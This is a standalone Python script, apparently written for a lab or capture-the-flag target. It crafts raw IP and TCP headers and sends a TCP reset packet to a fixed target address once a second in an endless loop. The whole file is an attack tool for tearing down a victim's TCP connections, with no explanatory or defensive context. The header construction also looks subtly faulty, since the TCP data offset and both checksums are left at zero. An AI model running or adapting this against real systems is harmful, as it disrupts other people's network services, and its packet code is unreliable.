#!/usr/bin/env python3
import socket
from struct import pack
from time import sleep

# |--------------------|--------------------|
# |     SOURCE PORT    |   DESTINATION PORT |
# |--------------------|--------------------|
# |            SEQUENCE NUMBER              |
# |--------------------|--------------------|
# |          ACKNOWLEDGMENT NUMBER          |
# |--------------------|--------------------|
# | DO:4|RSV:3|FLAGSi:9|      WINDOW        |
# |--------------------|--------------------|
# |    Checksum        |    URGENT POINTER  |
# |--------------------|--------------------|

def ip_header(src, dst):
    return pack("!BBHHHBBH4s4s", 69, 0, 0, 1, 0, 64, 6, 0, socket.inet_aton(src), socket.inet_aton(dst))

my_ip = '10.10.11.181' # change to your IP
target_ip = '10.10.10.65'

sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
sock.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
ip_hdr = ip_header(my_ip, target_ip)

# Define the TCP RST packet
source_port = 1337
destination_port = 7331
sequence_number = 321342
acknowledgment_number = 81321
data = b''

# Create the TCP header
tcp_hdr = pack('!HHLLBBHHH', source_port, destination_port, sequence_number, acknowledgment_number, 0, 0x04, 0, 0, 0)

while True:
    sock.sendto(ip_hdr + tcp_hdr + data, (target_ip, 0))
    sleep(1)
